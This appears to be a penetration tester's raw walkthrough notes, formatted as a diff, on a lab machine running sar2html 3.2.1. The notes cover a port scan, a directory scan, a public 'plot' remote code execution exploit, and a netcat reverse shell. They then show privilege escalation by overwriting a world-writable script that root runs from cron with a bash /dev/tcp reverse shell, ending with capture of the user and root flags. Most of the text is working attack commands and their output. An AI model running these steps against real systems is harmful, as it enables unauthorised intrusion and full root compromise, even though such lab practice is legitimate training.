@@ -1,0 +1,193 @@
+└─$ nmap -p- 172.16.33.13                     
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 06:16 EDT
+Nmap scan report for 172.16.33.13
+Host is up (0.038s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+└─$ nmap -sV -A -p 80 172.16.33.13            
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 21:49 EDT
+Nmap scan report for 172.16.33.13
+Host is up (0.039s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+
+└─$ sudo dirsearch -u http://172.16.33.13 -e php,html
+[sudo] password for kali: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           
+ (_||| _) (/_(_|| (_| )                                                                                                                                    
+                                                                                                                                                           
+Extensions: php, html | HTTP method: GET | Threads: 25 | Wordlist size: 9893
+
+Output File: /home/kali/reports/http_172.16.33.13/_24-05-19_21-48-16.txt
+
+Target: http://172.16.33.13/
+
+[21:48:16] Starting:                                                                                                                                       
+[21:48:19] 403 -  277B  - /.ht_wsr.txt                                      
+[21:48:19] 403 -  277B  - /.htaccess.bak1                                   
+[21:48:19] 403 -  277B  - /.htaccess.orig
+[21:48:19] 403 -  277B  - /.htaccess.sample                                 
+[21:48:19] 403 -  277B  - /.htaccess.save
+[21:48:19] 403 -  277B  - /.htaccess_extra                                  
+[21:48:19] 403 -  277B  - /.htaccess_sc                                     
+[21:48:19] 403 -  277B  - /.htaccess_orig
+[21:48:19] 403 -  277B  - /.htaccessBAK
+[21:48:19] 403 -  277B  - /.htaccessOLD
+[21:48:19] 403 -  277B  - /.htaccessOLD2                                    
+[21:48:19] 403 -  277B  - /.htm                                             
+[21:48:19] 403 -  277B  - /.html
+[21:48:19] 403 -  277B  - /.htpasswd_test                                   
+[21:48:19] 403 -  277B  - /.htpasswds
+[21:48:19] 403 -  277B  - /.httr-oauth
+[21:48:20] 403 -  277B  - /.php                                             
+[21:48:37] 200 -   24KB - /phpinfo.php                                      
+[21:48:40] 200 -    9B  - /robots.txt                                       
+[21:48:41] 403 -  277B  - /server-status                                    
+[21:48:41] 403 -  277B  - /server-status/                                   
+                     
+Task Completed 
+
+robots.txt    sar2HTML
+
+http://172.16.33.13/sar2HTML/index.php
+#got the sar2html verison 3.2.1
+
+└─$ searchsploit sar2html 3.2.1                   
+------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                           |  Path
+------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+sar2html 3.2.1 - 'plot' Remote Code Execution                                                                            | php/webapps/49344.py
+
+└─$ python3 49344.py            
+Enter The url => http://172.16.33.13/sar2HTML/index.php
+
+Command => whoami
+HPUX
+Linux
+SunOS
+www-data
+
+Command => nc -nv 10.8.0.234 80 | /bin/bash | nc -nv 10.8.0.234 8080
+
+#listen these ports on my host,then got a www-data named shell
+
+
+
+uname -a
+cat /etc/os*
+
+Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+NAME="Ubuntu"
+VERSION="18.04.3 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.3 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+
+#the kernel expliotation failed. try to find the usid of www-data account
+find / -user root -type f -perm -u=s 2>/ev/null
+
+/usr/bin/arping
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/sbin/pppd
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/bin/fusermount
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/su
+# these tools and binaries are not useful, after search on site gtfobins.
+#get to the dirc /var/www/html  ls -la
+drwxr-xr-x 3 www-data www-data  4096 Oct 21  2019 .
+drwxr-xr-x 4 www-data www-data  4096 Oct 21  2019 ..
+-rwxr-xr-x 1 root     root        22 Oct 20  2019 finally.sh
+-rw-r--r-- 1 www-data www-data 10918 Oct 20  2019 index.html
+-rw-r--r-- 1 www-data www-data    21 Oct 20  2019 phpinfo.php
+-rw-r--r-- 1 root     root         9 Oct 21  2019 robots.txt
+drwxr-xr-x 4 www-data www-data  4096 Oct 20  2019 sar2HTML
+-rwxrwxrwx 1 www-data www-data    30 Oct 21  2019 write.sh
+
+
+
+
+
+cat finally.sh
+./write.sh
+#the content of write.sh is ditable to www-data, and it will be run by root account by the way of finally.sh.
+#how to run finally file, try to check the crontab file.
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
+#finally.sh will be run every 5 mins. luckily. 
+
+#To write the reverse shell into the file write.sh, I found wget is available to www-data
+#on my host, create a write.sh file
+
+sudo nano write.sh 
+└─$ cat write.sh                            
+#!/bin/bash
+bash -i >& /dev/tcp/10.8.0.234/4444 0>&1
+
+#on the target machine,
+rm write.sh
+
+wget http://IP/write.sh -O write.sh
+chmod 777 write.sh
+
+
+─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.0.234] from (UNKNOWN) [172.16.33.13] 35784
+bash: cannot set terminal process group (14109): Inappropriate ioctl for device
+bash: no job control in this shell
+root@sar:/var/www/html# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@sar:/home/love/Desktop# cat user.txt
+cat user.txt
+427a7e47deb4a8649c7cab38df232b52
+
+root@sar:~# cat root.txt
+cat root.txt
+66f93d6b2ca96c9ad78a8a9ba0008e99
